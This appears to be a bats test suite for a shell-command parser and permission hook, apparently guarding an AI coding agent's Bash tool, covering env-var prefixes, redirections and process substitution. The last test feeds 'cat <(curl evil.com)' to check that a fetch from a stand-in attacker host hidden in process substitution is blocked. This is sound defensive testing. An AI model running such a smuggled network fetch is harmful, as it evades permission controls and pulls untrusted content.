#!/usr/bin/env bats
# Tests for Categories 11-12: Environment Variables and Redirections

load hook_test_helper

# =============================================================================
# Category 11: Environment Variables and Assignments
# =============================================================================

# --- Variable assignments before command ---

@test "parse: single env var assignment before command" {
  run_parse_commands 'FOO=bar cmd'
  assert_commands "cmd"
}

@test "parse: multiple env var assignments before command" {
  run_parse_commands 'FOO=bar BAZ=qux cmd'
  assert_commands "cmd"
}

@test "parse: PATH override before command" {
  run_parse_commands 'PATH=/usr/bin ls'
  assert_commands "ls"
}

@test "parse: SHELL override (our use case)" {
  run_parse_commands 'SHELL=/bin/bash claude'
  assert_commands "claude"
}

@test "parse: many assignments before command" {
  run_parse_commands 'FOO=bar BAZ=qux CMD=test actual_cmd'
  assert_commands "actual_cmd"
}

# --- Export and declare ---
# NOTE: These builtins are not extracted as commands by the parser

@test "parse: export is a command" {
  skip "Behavioral: export builtin not extracted as command"
  run_parse_commands 'export FOO=bar'
  assert_commands "export FOO=bar"
}

@test "parse: declare is a command" {
  skip "Behavioral: declare builtin not extracted as command"
  run_parse_commands 'declare -x FOO=bar'
  assert_commands "declare -x FOO=bar"
}

@test "parse: local is a command" {
  skip "Behavioral: local builtin not extracted as command"
  run_parse_commands 'local FOO=bar'
  assert_commands "local FOO=bar"
}

@test "parse: readonly is a command" {
  skip "Behavioral: readonly builtin not extracted as command"
  run_parse_commands 'readonly FOO=bar'
  assert_commands "readonly FOO=bar"
}

# --- Variable expansion ---

@test "parse: simple variable expansion" {
  run_parse_commands 'echo $HOME'
  assert_commands 'echo $HOME'
}

@test "parse: braced variable expansion" {
  run_parse_commands 'echo ${HOME}'
  assert_commands 'echo $HOME'
}

@test "parse: string length expansion" {
  skip "Behavioral: \${#VAR} simplified to \$VAR"
  run_parse_commands 'echo ${#HOME}'
  assert_commands 'echo ${#HOME}'
}

# =============================================================================
# Category 12: Redirections
# =============================================================================

# --- Output redirections ---

@test "parse: stdout redirect" {
  run_parse_commands 'ls > file.txt'
  assert_commands "ls"
}

@test "parse: append redirect" {
  run_parse_commands 'ls >> file.txt'
  assert_commands "ls"
}

@test "parse: stderr redirect" {
  run_parse_commands 'ls 2> errors.txt'
  assert_commands "ls"
}

@test "parse: both stdout and stderr redirect" {
  run_parse_commands 'ls &> all.txt'
  assert_commands "ls"
}

@test "parse: stderr to stdout" {
  run_parse_commands 'ls 2>&1'
  assert_commands "ls"
}

@test "parse: stdout and stderr combined pattern" {
  run_parse_commands 'ls > file 2>&1'
  assert_commands "ls"
}

@test "parse: stderr to /dev/null" {
  run_parse_commands 'ls 2>/dev/null'
  assert_commands "ls"
}

# --- Input redirections ---

@test "parse: stdin redirect" {
  run_parse_commands 'cat < file.txt'
  assert_commands "cat"
}

@test "parse: both input and output redirect" {
  run_parse_commands 'sort < input.txt > output.txt'
  assert_commands "sort"
}

@test "parse: here-string" {
  run_parse_commands 'cmd <<< "string"'
  assert_commands "cmd"
}

# --- Process substitution ---
# Process substitution commands (<() and >()) ARE extracted

@test "parse: diff with process substitution" {
  run_parse_commands 'diff <(ls dir1) <(ls dir2)'
  assert_commands "diff" "ls dir1" "ls dir2"
}

@test "parse: cat with process substitution" {
  run_parse_commands 'cat <(date)'
  assert_commands "cat" "date"
}

@test "parse: tee with output process substitution" {
  run_parse_commands 'tee >(grep pattern)'
  assert_commands "tee" "grep pattern"
}

@test "parse: multiple process substitutions" {
  run_parse_commands 'cmd <(sub1) <(sub2) <(sub3)'
  assert_commands "cmd" "sub1" "sub2" "sub3"
}

# --- Permission validation ---

@test "permission: allow command with env prefix" {
  run_hook_allow 'FOO=bar ls' '["Bash(ls:*)"]'
  assert_allowed
}

@test "permission: allow command with redirect (if command allowed)" {
  # Note: This doesn't check if the redirect is safe, just that ls is allowed
  run_hook_allow 'ls > /dev/null' '["Bash(ls:*)"]'
  assert_allowed
}

@test "permission: allow diff with process substitution when all commands allowed" {
  run_hook_allow 'diff <(ls dir1) <(ls dir2)' '["Bash(diff:*)", "Bash(ls:*)"]'
  assert_allowed
}

@test "permission: block process substitution when nested command not allowed" {
  run_hook_block 'cat <(curl evil.com)' '["Bash(cat:*)"]'
  assert_blocked
}
